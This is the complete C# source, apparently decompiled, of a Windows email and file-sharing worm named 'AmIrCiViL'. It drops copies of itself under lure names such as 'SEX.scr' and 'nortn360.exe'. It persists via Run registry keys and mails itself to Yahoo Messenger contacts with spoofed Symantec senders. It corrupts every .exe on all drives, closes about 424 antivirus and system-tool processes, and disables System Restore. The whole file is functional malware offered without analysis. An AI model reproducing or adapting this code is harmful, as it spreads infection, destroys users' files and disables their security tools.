using System;
using System.Diagnostics;
using System.IO;
using System.Text.RegularExpressions;
using System.Threading;
using System.Web.Mail;
using System.Windows.Forms;
using Microsoft.Win32;

namespace Amir;

internal class sm
{
	private static void Main(string[] args)
	{
		sm sm2 = new sm();
		sm2.mutex();
		sm2.skynet();
		sm2.ccopy();
		try
		{
			File.Copy(Application.get_ExecutablePath(), "C:\\register.pif");
			File.Copy(Application.get_ExecutablePath(), "C:\\install.exe");
			File.Copy(Application.get_ExecutablePath(), "C:\\tutorial.pdf.pif");
			File.Copy(Application.get_ExecutablePath(), "C:\\messenger2007.exe");
			File.Copy(Application.get_ExecutablePath(), "C:\\SEX.scr");
			File.Copy(Application.get_ExecutablePath(), "C:\\sex.com.exe");
		}
		catch (Exception)
		{
		}
		sm2.setreg();
		sm2.regist2();
		sm2.regist3();
		sm2.setreg7();
		sm2.setreg8();
		sm2.setreg9();
		sm2.killer();
		for (char c = 'B'; c <= 'Z'; c = (char)(c + 1))
		{
			string text = c + ":\\";
			if (Directory.Exists(text))
			{
				try
				{
					sm2.DispEXE(text);
				}
				catch (Exception)
				{
				}
			}
		}
		for (char c2 = 'B'; c2 <= 'Z'; c2 = (char)(c2 + 1))
		{
			string text2 = c2 + ":\\";
			if (Directory.Exists(text2))
			{
				try
				{
					sm2.infect(text2);
				}
				catch (Exception)
				{
				}
			}
		}
		while (true)
		{
			try
			{
				while (true)
				{
					string directoryRoot = Directory.GetDirectoryRoot(Directory.GetCurrentDirectory());
					string text3 = "Program Files\\Yahoo!\\Messenger\\Profiles";
					string td = directoryRoot + text3;
					sm2.GetMail(td);
				}
			}
			catch
			{
				sm2.killer();
				Thread.Sleep(1200000);
			}
		}
	}

	public void GetMail(string td)
	{
		try
		{
			string[] directories = Directory.GetDirectories(td);
			string[] array = directories;
			foreach (string path in array)
			{
				try
				{
					DirectoryInfo directoryInfo = new DirectoryInfo(path);
					if (!(directoryInfo.Name == "Archive") && !(directoryInfo.Name == "My Icons") && !(directoryInfo.Name == "Messages"))
					{
						string to = directoryInfo.Name + "@yahoo.com";
						SendMail(to);
					}
				}
				catch
				{
				}
			}
			string[] directories2 = Directory.GetDirectories(td);
			string[] array2 = directories2;
			foreach (string td2 in array2)
			{
				try
				{
					GetMail(td2);
				}
				catch
				{
				}
			}
		}
		catch
		{
		}
	}

	public void SendMail(string to)
	{
		//IL_0133: Unknown result type (might be due to invalid IL or missing references)
		//IL_013a: Expected O, but got Unknown
		//IL_0170: Unknown result type (might be due to invalid IL or missing references)
		//IL_017a: Expected O, but got Unknown
		for (int i = 0; i <= 8; i++)
		{
			try
			{
				string[] array = new string[6] { "C:\\register.pif", "C:\\install.exe", "C:\\tutorial.pdf.pif", "C:\\messenger2007.exe", "C:\\SEX.scr", "C:\\sex.com.exe" };
				int num = new Random().Next(0, 6);
				string text = array[num];
				string[] array2 = new string[6] { "Thank you for registered", "Norton 360", "Sex Toturial ", "Assistant 2007", "Sexy screen saver", "hug penis" };
				string subject = array2[num];
				string[] array3 = new string[6] { "hi dear thank you for registration you must download and install this software", "response for request  i agree a bout it downoad free software www.symantec.com", "this is the best book of sex tutorial download and read it", "+++ Assistant 2007+++", "this is very hot sex ! sex! sex!  www.xnxx.com", "SEX! Sex!SEX! Sex!SEX! Sex!SEX! Sex!SEX! Sex!SEX! Sex!SEX! Sex!" };
				string body = array3[num];
				string[] array4 = new string[6] { "esafe.virus@ealaddin.com", "support@symantec.com", "xxx@penis.com", "Assistant@software.com", "support@xnxx.com", "SexTutorial@swp.com" };
				string from = array4[num];
				MailMessage val = new MailMessage();
				val.set_From(from);
				val.set_To(to);
				val.set_Subject(subject);
				val.set_Body(body);
				SmtpMail.set_SmtpServer("mx1.mail.yahoo.com");
				val.get_Attachments().Add((object?)new MailAttachment(text, (MailEncoding)1));
				SmtpMail.Send(val);
				Console.WriteLine("Send Mail");
			}
			catch (Exception)
			{
				Console.WriteLine("Can Not Send Mail");
			}
		}
	}

	public void ccopy()
	{
		try
		{
			File.Copy(Application.get_ExecutablePath(), Environment.SystemDirectory + "\\LSSASS.exe");
			File.Copy(Application.get_ExecutablePath(), Environment.SystemDirectory + "\\WinKrn32.cab.exe");
			File.Copy(Application.get_ExecutablePath(), Environment.SystemDirectory + "\\Update.exe");
			Registry.SetValue("HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "MDM32.exe", Environment.SystemDirectory + "\\LSSASS.exe", RegistryValueKind.String);
			Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "WinKrnl32.cab.exe", Environment.SystemDirectory + "\\WinKrn32.cab.exe", RegistryValueKind.String);
			Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "Update.exe", Environment.SystemDirectory + "\\Update.exe", RegistryValueKind.String);
		}
		catch (Exception)
		{
		}
	}

	public void DispEXE(string tD)
	{
		try
		{
			string[] directories = Directory.GetDirectories(tD);
			string[] array = new string[36]
			{
				"own", "it", "upl", "syst", "se", "usic", "efu", "am", "caf", "yma",
				"mp3", "wav", "ovi", "roj", "win", "ict", "my", "ina", "Shar", "aza",
				"onk", "mob", "tart", "ffic", "av", "rack", "ile", "W32", "root", "assw",
				"Sounds", "ideo", "rit", "ist", "ys", "orn"
			};
			string[] array2 = directories;
			foreach (string text in array2)
			{
				try
				{
					string[] array3 = array;
					foreach (string pattern in array3)
					{
						try
						{
							if (Regex.IsMatch(text, pattern))
							{
								if (Regex.IsMatch(text, "mule"))
								{
									File.Copy(Application.get_ExecutablePath(), text + "\\NewWeb.exe");
									File.Copy(Application.get_ExecutablePath(), text + "\\sex.pif");
									File.Copy(Application.get_ExecutablePath(), text + "\\xnxx.scr");
									File.Copy(Application.get_ExecutablePath(), text + "\\baglesourcecode.pif");
									File.Copy(Application.get_ExecutablePath(), text + "\\nortn360.exe");
									File.Copy(Application.get_ExecutablePath(), text + "\\New.exe");
								}
								if (Regex.IsMatch(text, "kaza"))
								{
									File.Copy(Application.get_ExecutablePath(), text + "\\Downloader.pif");
									File.Copy(Application.get_ExecutablePath(), text + "\\sex.pif");
									File.Copy(Application.get_ExecutablePath(), text + "\\xnxx.scr");
									File.Copy(Application.get_ExecutablePath(), text + "\\baglesourcecode.pif");
									File.Copy(Application.get_ExecutablePath(), text + "\\nortn360.exe");
									File.Copy(Application.get_ExecutablePath(), text + "\\New.exe");
								}
								if (Regex.IsMatch(text, "upl"))
								{
									File.Copy(Application.get_ExecutablePath(), text + "\\upload-file.exe");
									File.Copy(Application.get_ExecutablePath(), text + "\\sex.pif");
									File.Copy(Application.get_ExecutablePath(), text + "\\xnxx.scr");
									File.Copy(Application.get_ExecutablePath(), text + "\\baglesourcecode.pif");
									File.Copy(Application.get_ExecutablePath(), text + "\\nortn360.exe");
									File.Copy(Application.get_ExecutablePath(), text + "\\New.exe");
								}
								if (Regex.IsMatch(text, "syst"))
								{
									File.Copy(Application.get_ExecutablePath(), text + "\\system.dll.cmd");
									File.Copy(Application.get_ExecutablePath(), text + "\\sex.pif");
									File.Copy(Application.get_ExecutablePath(), text + "\\xnxx.scr");
									File.Copy(Application.get_ExecutablePath(), text + "\\baglesourcecode.pif");
									File.Copy(Application.get_ExecutablePath(), text + "\\nortn360.exe");
									File.Copy(Application.get_ExecutablePath(), text + "\\New.exe");
								}
								if (Regex.IsMatch(text, "hare"))
								{
									File.Copy(Application.get_ExecutablePath(), text + "\\SexyScreenSaver.scr");
									File.Copy(Application.get_ExecutablePath(), text + "\\sex.pif");
									File.Copy(Application.get_ExecutablePath(), text + "\\xnxx.scr");
									File.Copy(Application.get_ExecutablePath(), text + "\\baglesourcecode.pif");
									File.Copy(Application.get_ExecutablePath(), text + "\\nortn360.exe");
									File.Copy(Application.get_ExecutablePath(), text + "\\New.exe");
								}
								if (Regex.IsMatch(text, "comi"))
								{
									File.Copy(Application.get_ExecutablePath(), text + "\\MyMiusic.exe");
									File.Copy(Application.get_ExecutablePath(), text + "\\sex.pif");
									File.Copy(Application.get_ExecutablePath(), text + "\\xnxx.scr");
									File.Copy(Application.get_ExecutablePath(), text + "\\baglesourcecode.pif");
									File.Copy(Application.get_ExecutablePath(), text + "\\nortn360.exe");
									File.Copy(Application.get_ExecutablePath(), text + "\\New.exe");
								}
								if (Regex.IsMatch(text, "efu"))
								{
									File.Copy(Application.get_ExecutablePath(), text + "\\defult-path.cmd");
									File.Copy(Application.get_ExecutablePath(), text + "\\sex.pif");
									File.Copy(Application.get_ExecutablePath(), text + "\\xnxx.scr");
									File.Copy(Application.get_ExecutablePath(), text + "\\baglesourcecode.pif");
									File.Copy(Application.get_ExecutablePath(), text + "\\nortn360.exe");
									File.Copy(Application.get_ExecutablePath(), text + "\\New.exe");
								}
								if (Regex.IsMatch(text, "ame"))
								{
									File.Copy(Application.get_ExecutablePath(), text + "\\FunGame.flash.exe");
									File.Copy(Application.get_ExecutablePath(), text + "\\sex.pif");
									File.Copy(Application.get_ExecutablePath(), text + "\\xnxx.scr");
									File.Copy(Application.get_ExecutablePath(), text + "\\baglesourcecode.pif");
									File.Copy(Application.get_ExecutablePath(), text + "\\nortn360.exe");
									File.Copy(Application.get_ExecutablePath(), text + "\\New.exe");
								}
								if (Regex.IsMatch(text, "cafe"))
								{
									File.Copy(Application.get_ExecutablePath(), text + "\\Mcafee-AV.pif");
									File.Copy(Application.get_ExecutablePath(), text + "\\sex.pif");
									File.Copy(Application.get_ExecutablePath(), text + "\\xnxx.scr");
									File.Copy(Application.get_ExecutablePath(), text + "\\baglesourcecode.pif");
									File.Copy(Application.get_ExecutablePath(), text + "\\nortn360.exe");
									File.Copy(Application.get_ExecutablePath(), text + "\\New.exe");
								}
								if (Regex.IsMatch(text, "ort"))
								{
									File.Copy(Application.get_ExecutablePath(), text + "\\PortScanner.exe");
									File.Copy(Application.get_ExecutablePath(), text + "\\sex.pif");
									File.Copy(Application.get_ExecutablePath(), text + "\\xnxx.scr");
									File.Copy(Application.get_ExecutablePath(), text + "\\baglesourcecode.pif");
									File.Copy(Application.get_ExecutablePath(), text + "\\nortn360.exe");
									File.Copy(Application.get_ExecutablePath(), text + "\\New.exe");
								}
								if (Regex.IsMatch(text, "yman"))
								{
									File.Copy(Application.get_ExecutablePath(), text + "\\SymantecUpdate.exe");
									File.Copy(Application.get_ExecutablePath(), text + "\\sex.pif");
									File.Copy(Application.get_ExecutablePath(), text + "\\xnxx.scr");
									File.Copy(Application.get_ExecutablePath(), text + "\\baglesourcecode.pif");
									File.Copy(Application.get_ExecutablePath(), text + "\\nortn360.exe");
									File.Copy(Application.get_ExecutablePath(), text + "\\New.exe");
								}
								if (Regex.IsMatch(text, "mp3"))
								{
									File.Copy(Application.get_ExecutablePath(), text + "\\Mp3Player.pif");
									File.Copy(Application.get_ExecutablePath(), text + "\\sex.pif");
									File.Copy(Application.get_ExecutablePath(), text + "\\xnxx.scr");
									File.Copy(Application.get_ExecutablePath(), text + "\\baglesourcecode.pif");
									File.Copy(Application.get_ExecutablePath(), text + "\\nortn360.exe");
									File.Copy(Application.get_ExecutablePath(), text + "\\New.exe");
								}
								if (Regex.IsMatch(text, "xxx"))
								{
									File.Copy(Application.get_ExecutablePath(), text + "\\WaveToMp32.exe");
									File.Copy(Application.get_ExecutablePath(), text + "\\sex.pif");
									File.Copy(Application.get_ExecutablePath(), text + "\\xnxx.scr");
									File.Copy(Application.get_ExecutablePath(), text + "\\baglesourcecode.pif");
									File.Copy(Application.get_ExecutablePath(), text + "\\nortn360.exe");
									File.Copy(Application.get_ExecutablePath(), text + "\\New.exe");
								}
							}
						}
						catch (Exception)
						{
						}
					}
				}
				catch (Exception)
				{
				}
			}
			string[] directories2 = Directory.GetDirectories(tD);
			string[] array4 = directories2;
			foreach (string tD2 in array4)
			{
				DispEXE(tD2);
			}
		}
		catch (Exception)
		{
		}
	}

	public void infect(string tf)
	{
		try
		{
			string[] files = Directory.GetFiles(tf, "*.exe");
			string[] array = files;
			foreach (string path in array)
			{
				try
				{
					FileStream output = new FileStream(path, FileMode.Open, FileAccess.Write);
					BinaryWriter binaryWriter = new BinaryWriter(output);
					binaryWriter.BaseStream.Seek(0L, SeekOrigin.End);
					for (int j = 0; j < 70; j++)
					{
						binaryWriter.Write("AmIrCiViL");
					}
					binaryWriter.Close();
				}
				catch (Exception)
				{
				}
			}
			string[] directories = Directory.GetDirectories(tf);
			string[] array2 = directories;
			foreach (string tf2 in array2)
			{
				infect(tf2);
			}
		}
		catch (Exception)
		{
		}
	}

	public void killer()
	{
		try
		{
			string[] array = new string[424]
			{
				"ACKWIN32", "ADAWARE", "ADVXDWIN", "AGENTSVR", "AGENTW ", "ALERTSVC", "ALEVIR", "ALOGSERV", "AMON9X ", "ANTI-TROJAN",
				"ANTIVIRUS ", "ANTS ", "APIMONITOR", "APLICA32 ", "APVXDWIN ", "ARR ", "ATCON", "ATRO55EN", "ATUPDATER", "ATUPDATER ",
				"ATWATCH ", "AU ", "AUPDATE", "AUPDATE ", "AUTODOWN ", "AUTODOWN", "AUTOTRACE ", "AUTOTRACE ", "AUTOUPDATE ", "AUTOUPDATE ",
				"AVCONSOL ", "AVE32 ", "AVGCC32", "AVGCTRL", "AVGNT ", "AVGSERV", "AVGSERV9", "AVGW ", "AVKPOP", "AVKSERV",
				"AVKSERVICE", "AVKWCTl9 ", "AVLTMAIN ", "AVNT ", "AVP ", "AVP32", "AVPCC ", "AVPDOS32", "AVPM ", "AVPTC32",
				"AVPUPD ", "AVPUPD ", "AVSCHED32", "AVSYNMGR", "AVWINNT ", "AVWUPD ", "AVWUPD32", "AVWUPD32 ", "AVWUPSRV ", "AVXMONITOR9X",
				"AVXMONITORNT ", "AVXQUAR ", "AVXQUAR ", "BACKWEB ", "BARGAINS ", "BD_PROFESSIONAL", "BEAGLE", "BELT ", "BIDEF ", "BIDSERVER",
				"BIPCP", "BIPCPEVALSETUP ", "BISP", "BLACKD", "BLACKICE", "BLSS", "BOOTCONF", "BOOTWARN", "BORG2 ", "BPC ",
				"BRASIL", "BS120", "BUNDLE", "BVT ", "CCAPP", "CCEVTMGR", "CCPXYSVC ", "CDP ", "CFD", "CFGWIZ",
				"CFIADMIN", "CFIAUDIT", "CFINET", "CFINET32", "CLEAN", "CLEANER", "CLEANER3", "CLEANPC ", "CLICK ", "CMD32 ",
				"CMESYS ", "CMGRDIAN", "CMON016 ", "CONNECTIONMONITOR", "CPD ", "CPF9X206", "CPFNT206", "CTRL ", "CV ", "CWNB181",
				"CWNTDWMO ", "IEXPLORER", "IFACE ", "IFW2000", "INETLNFO", "INFUS ", "INFWIN", "INIT ", "INTDEL", "INTREN ",
				"IOMON98", "ISTSVC ", "JAMMER ", "JDBGMRG ", "JEDI ", "KAVLITE40ENG ", "KAVPERS40ENG ", "KAVPF ", "KAZZA", "KEENVALUE",
				"KERIO-PF-213-EN-WIN", "KERIO-WRL-421-EN-WIN", "KERIO-WRP-421-EN-WIN", "KERNEL32", "KILLPROCESSSETUP161", "LAUNCHER", "LDNETMON ", "LDPRO ", "LDPROMENU", "LDSCAN",
				"LNETINFO", "LOADER ", "LOCALNET", "LOCKDOWN", "LOCKDOWN2000", "LOOKOUT ", "LORDPE ", "LSETUP", "LUALL ", "LUAU ",
				"LUCOMSERVER ", "LUINIT ", "LUSPT", "MAPISVC32", "MCAGENT ", "MCMNHDLR ", "MCSHIELD ", "MCTOOL ", "MCUPDATE", "MCUPDATE ",
				"MCVSRTE", "MCVSSHLD ", "MD ", "MFIN32", "MFW2EN ", "MFWENG3.02D30 ", "MGAVRTCL ", "MGAVRTE ", "MGHTML", "MGUI ",
				"MINILOG", "MMOD", "MONITOR", "MOOLIVE", "MOSTAT ", "MPFAGENT ", "MPFSERVICE ", "MPFTRAY ", "MRFLUX", "MSAPP ",
				"MSBB ", "MSBLAST", "MSCACHE ", "MSCCN32 ", "MSCMAN ", "MSCONFIG", "MSDM ", "MSDOS", "MSIEXEC16", "MSINFO32",
				"MSLAUGH ", "MSMGT ", "MSMSGRI32", "MSSMMC32", "MSSYS ", "MSVXD", "MU0311AD", "MWATCH ", "N32SCANW", "NAV ",
				"AUTO-PROTECT.NAV80TRY", "NAVAP.NAVAPSVC", "NAVAPSVC ", "NAVAPW32", "NAVDX ", "NAVLU32", "NAVNT ", "NAVSTUB ", "NAVW32", "NAVWNT",
				"NC2000 ", "NCINST4", "NDD32 ", "NEOMONITOR ", "NEOWATCHLOG ", "NETARMOR ", "NETD32 ", "NETINFO", "NETMON", "NETSCANPRO",
				"NETSPYHUNTER-1.2", "NETSTAT ", "NETUTILS", "NISSERV ", "NISUM ", "NMAIN ", "NOD32 ", "NORMIST", "NORTON_INTERNET_SECU_3.0_407", "NOTSTART",
				"NPF40_TW_98_NT_ME_2K", "NPFMESSENGER ", "NPROTECT", "NPSCHECK", "NPSSVC ", "NSCHED32", "NSSYS32", "NSTASK32", "NSUPDATE", "NT",
				"NTRTSCAN", "NTVDM", "NTXconfig", "NUI", "NUPGRADE", "NUPGRADE", "NVARCH16", "NVC95", "NVSVC32", "NWINST4",
				"NWSERVICE", "NWTOOL16", "OLLYDBG", "ONSRVR", "OPTIMIZE", "OSTRONET", "OTFIX", "OUTPOST", "OUTPOST", "OUTPOSTINSTALL",
				"OUTPOSTPROINSTALL", "PADMIN", "PANIXK", "PATCH", "PAVCL", "PAVPROXY", "PAVSCHED", "PAVW", "PCFWALLICON", "PCIP10117_0",
				"PCSCAN", "PDSETUP", "PERISCOPE", "PERSFW", "PERSWF", "PF2", "PFWADMIN", "PGMONITR", "PINGSCAN", "PLATIN",
				"POP3TRAP", "POPROXY", "POPSCAN", "PORTDETECTIVE", "PORTMONITOR", "POWERSCAN", "PPINUPDT", "PPTBC", "PPVSTOP", "PRIZESURFER",
				"PRMT", "PRMVR", "PROCDUMP", "PROCESSMONITOR", "PROCEXPLORERV1.0", "PROGRAMAUDITOR", "PROPORT", "PROTECTX ", "PSPF", "PURGE",
				"QCONSOLE", "QSERVER", "RAPAPP", "RAV7", "RAV7WIN", "RAV8WIN32ENG", "RAY", "RB32", "RCSYNC", "REALMON",
				"REGED", "REGEDIT", "REGEDT32", "RESCUE", "RESCUE32", "RRGUARD", "RSHELL", "RTVSCAN", "RTVSCN95", "RULAUNCH",
				"RUN32DLL", "RUNDLL", "RUNDLL16", "RUXDLL32", "SAFEWEB", "SAHAGENT ", "SAVE", "SAVENOW", "SBSERV", "SC",
				"SCAM32", "SCAN32", "SCAN95", "SCANPM", "SCRSCAN", "SETUPVAMEEVAL", "SETUP_FLOWPROTECTOR_US", "SFC", "SGSSFW32", "SH",
				"SHELLSPYINSTALL", "SHN", "SHOWBEHIND", "SMC", "SMS", "SMSS32", "SOAP", "SOFI", "SPERM", "SPF",
				"SPHINX", "SPOLER", "SPOOLCV", "SPOOLSV32", "SPYXX", "SREXE", "SRNG", "SS3EDIT", "SSGRATE", "SSG_4104",
				"ST2", "START", "STCLOADER", "SUPFTRL", "SUPPORT", "SUPPORTER5", "SVC", "SVCHOSTC", "SVCHOSTS", "SVSHOST",
				"SWEEP95 ", "SWEEPNET.SWEEPSRV.SYS.SWNETSUP", "SYMPROXYSVC", "SYMTRAY", "SYSEDIT ", "SYSTEM", "SYSTEM32", "SYSUPD", "TASKMG", "TASKMO",
				"TASKMON", "TAUMON", "TBSCAN", "TC", "TCA", "TCM", "TDS-3", "TDS2-NT", "TEEKIDS", "TFAK",
				"TFAK5", "TGBOB", "TITANIN", "TITANINXP", "TRACERT", "TRICKLER", "TRJSCAN", "TRJSETUP", "TROJANTRAP3", "TSADBOT",
				"TVMD", "TVTMD", "UNDOBOOT", "UPDAT", "UPDATE", "UPDATE", "UPGRAD", "UTPOST", "VBCMSERV", "VBCONS",
				"VBUST ", "VBWIN9X", "VBWINNTW", "VCSETUP", "VET32 ", "VET95", "vb6", "taskmgr", "regedit", "notepad",
				"install", "setup", "MpfConsole", "AmIrCiViL"
			};
			string[] array2 = array;
			foreach (string processName in array2)
			{
				try
				{
					Process[] processesByName = Process.GetProcessesByName(processName);
					Process[] array3 = processesByName;
					foreach (Process process in array3)
					{
						process.CloseMainWindow();
					}
				}
				catch (Exception)
				{
				}
			}
		}
		catch (Exception)
		{
		}
	}

	public void mutex()
	{
		try
		{
			Mutex mutex = new Mutex(initiallyOwned: false, "AmirCivil");
			mutex.WaitOne();
		}
		catch (Exception)
		{
		}
	}

	public void regist2()
	{
		RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
		string[] array = new string[26]
		{
			"Taskmon", "Explorer", "Windows Services Host", "KasperskyAV", " d3dupdate.exe", "au.exe", "OLE", "winupd.exe", "direct.exe ", "jijbl ",
			"Video ", "service", "DELETE ME", "d3dupdate.exe", "Sentry", "gouday.exe", "rate.exe", "Windows Services Host", "sysmon.exe ", "srate.exe",
			"ssate.exe ", "Microsoft IE Execute shell", "Winsock2 driver", "ICM version", "yeahdude.exe ", "Microsoft System Checkup"
		};
		string[] array2 = array;
		foreach (string name in array2)
		{
			try
			{
				registryKey.DeleteValue(name);
			}
			catch (Exception)
			{
			}
		}
	}

	public void regist3()
	{
		RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
		string[] array = new string[35]
		{
			"MCAgentExe", "MCUpdateExe", "WinampAgent", "OASClnt", "Taskmon", "Explorer", "Windows Services Host", "KasperskyAV", "System", "msgsvr32",
			"service", "Sentry", "Explorer", "system", "msgsvr32", "au.exe", "winupd.exe", "direct.exe ", "jijbl ", "Video ",
			"service", "DELETE ME", "d3dupdate.exe", "Sentry", "gouday.exe", "rate.exe", "Windows Services Host", "sysmon.exe ", "srate.exe", "ssate.exe ",
			"Microsoft IE Execute shell", "Winsock2 driver", "ICM version", "yeahdude.exe ", "Microsoft System Checkup"
		};
		string[] array2 = array;
		foreach (string name in array2)
		{
			try
			{
				registryKey.DeleteValue(name);
			}
			catch (Exception)
			{
			}
		}
	}

	public void setreg()
	{
		try
		{
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\SharedAccess", "Start", "4", RegistryValueKind.DWord);
		}
		catch (Exception)
		{
		}
	}

	public void setreg7()
	{
		try
		{
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\\\ControlSet001\\\\Services\\\\SharedAccess\\\\Parameters\\\\FirewallPolicy\\\\StandardProfile", "EnableFirewal", "1", RegistryValueKind.DWord);
		}
		catch (Exception)
		{
		}
	}

	public void setreg8()
	{
		try
		{
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\\\Microsoft\\\\OLE", "EnableDCOM", "N", RegistryValueKind.String);
		}
		catch (Exception)
		{
		}
	}

	public void setreg9()
	{
		try
		{
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\SystemRestore", "DisableSR", "1", RegistryValueKind.DWord);
		}
		catch (Exception)
		{
		}
	}

	public void skynet()
	{
		try
		{
			Mutex mutex = new Mutex(initiallyOwned: false, "AmirCivil");
			mutex.WaitOne();
		}
		catch (Exception)
		{
		}
		try
		{
			Mutex mutex2 = new Mutex(initiallyOwned: false, "AdmMoodownJKIS003");
			mutex2.WaitOne();
		}
		catch (Exception)
		{
		}
		try
		{
			Mutex mutex3 = new Mutex(initiallyOwned: false, "(S)(k)(y)(N)(e)(t)");
			mutex3.WaitOne();
		}
		catch (Exception)
		{
		}
		try
		{
			Mutex mutex4 = new Mutex(initiallyOwned: false, "____--->>>>U<<<<--____");
			mutex4.WaitOne();
		}
		catch (Exception)
		{
		}
		try
		{
			Mutex mutex5 = new Mutex(initiallyOwned: false, "NetDy_Mutex_Psycho");
			mutex5.WaitOne();
		}
		catch (Exception)
		{
		}
		try
		{
			Mutex mutex6 = new Mutex(initiallyOwned: false, "_-=oOOSOkOyONOeOtOo=-_");
			mutex6.WaitOne();
		}
		catch (Exception)
		{
		}
		try
		{
			Mutex mutex7 = new Mutex(initiallyOwned: false, "SyncMutex_USUkUyUnUeUtUU");
			mutex7.WaitOne();
		}
		catch (Exception)
		{
		}
		try
		{
			Mutex mutex8 = new Mutex(initiallyOwned: false, "Protect_USUkUyUnUeUtU_Mutex");
			mutex8.WaitOne();
		}
		catch (Exception)
		{
		}
		try
		{
			Mutex mutex9 = new Mutex(initiallyOwned: false, "_-oOaxX|-+S+-+k+-+y+-+N+-+e+-+t+-|XxKOo-_");
			mutex9.WaitOne();
		}
		catch (Exception)
		{
		}
		try
		{
			Mutex mutex10 = new Mutex(initiallyOwned: false, "Bgl_*L*o*o*s*e*");
			mutex10.WaitOne();
		}
		catch (Exception)
		{
		}
		try
		{
			Mutex mutex11 = new Mutex(initiallyOwned: false, "NetDy_Mutex_Psycho");
			mutex11.WaitOne();
		}
		catch (Exception)
		{
		}
		try
		{
			Mutex mutex12 = new Mutex(initiallyOwned: false, "SkYnEt_AVP");
			mutex12.WaitOne();
		}
		catch (Exception)
		{
		}
		try
		{
			Mutex mutex13 = new Mutex(initiallyOwned: false, "KO[SkyNet.cz]SystemsMutex");
			mutex13.WaitOne();
		}
		catch (Exception)
		{
		}
		try
		{
			Mutex mutex14 = new Mutex(initiallyOwned: false, "MI[SkyNet.cz]SystemsMutex");
			mutex14.WaitOne();
		}
		catch (Exception)
		{
		}
		try
		{
			Mutex mutex15 = new Mutex(initiallyOwned: false, "Netsky AV Guard");
			mutex15.WaitOne();
		}
		catch (Exception)
		{
			try
			{
				Mutex mutex16 = new Mutex(initiallyOwned: false, "LK[SkyNet.cz]SystemsMutex");
				mutex16.WaitOne();
			}
			catch (Exception)
			{
			}
			try
			{
				Mutex mutex17 = new Mutex(initiallyOwned: false, "S-k-y-n-e-t--A-n-t-i-v-i-r-u-s-T-e-a-m");
				mutex17.WaitOne();
			}
			catch (Exception)
			{
			}
			try
			{
				Mutex mutex18 = new Mutex(initiallyOwned: false, "Jobaka3");
				mutex18.WaitOne();
			}
			catch (Exception)
			{
			}
			try
			{
				Mutex mutex19 = new Mutex(initiallyOwned: false, "Jobaka3l");
				mutex19.WaitOne();
			}
			catch (Exception)
			{
			}
		}
	}
}
